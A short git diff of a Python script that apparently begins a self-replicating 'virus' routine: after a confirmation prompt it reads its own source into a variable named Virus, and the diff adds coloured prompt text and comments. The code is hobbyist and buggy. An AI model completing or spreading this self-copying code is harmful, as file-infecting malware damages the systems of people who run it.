@@ -3,18 +3,24 @@
 #START#
 
 import os
+#for sys interupt
 import sys
+#for colors
+from colorama import Fore, Style, init
+init(autoreset=True)
 
 dir = os.getcwd()
 print("working  directory" + dir)
 
-print("are you sure you want to run this?")
-runPayload = input("type Yes or No: ")
+print(Fore.YELLOW +"Are you sure you want to run this?")
+print("type " + Fore.RED + "Yes" + Style.RESET_ALL + " or " + Fore.GREEN + "No:" + Style.RESET_ALL)
+
+runPayload = input(" ")
 try:
     if runPayload is "yes":
     #read code from current program
 
-        File = open(__file__, "r")  
+        File = open(__file__, "r")   #add colours and stuff later as warnings -- it keeps exiting so fix that
         Virus = ""
         readVirus = False
     for line in File:
